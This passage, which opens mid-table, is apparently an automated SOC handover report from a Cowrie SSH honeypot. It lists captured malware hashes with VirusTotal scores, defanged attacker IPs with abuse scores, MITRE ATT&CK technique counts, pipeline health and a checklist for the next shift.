| `43.136.119[.]249` | 1 | 2026-06-13 20:10 | 2026-06-13 20:12 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `201.55.113[.]122` | BR | ALGAR TELECOM S/A | **100** ⚠️ | 3 |
| `213.136.88[.]112` | FR | Contabo GmbH | **100** ⚠️ | 1 |
| `157.230.150[.]187` | US | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `62.171.168[.]158` | FR | Contabo GmbH | **100** ⚠️ | 3 |
| `120.48.33[.]21` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 40 |
| `43.136.119[.]249` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 1 |
| `168.144.95[.]137` | IN | DigitalOcean, LLC | **100** ⚠️ | 34 |
| `148.153.188[.]246` | US | CDS Global Cloud Co., Ltd | **100** ⚠️ | 50 |
| `223.247.218[.]112` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `186.68.83[.]104` | EC | Satnet Gye Coorp CM | **100** ⚠️ | 48 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 80 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 27 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 153 cases |
| Tool 34  | Credential Extractor        | ✅ 62 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (18.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 18 recon entry/entries in table (9 group(s) consolidating 103 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-13T21:21:28Z_
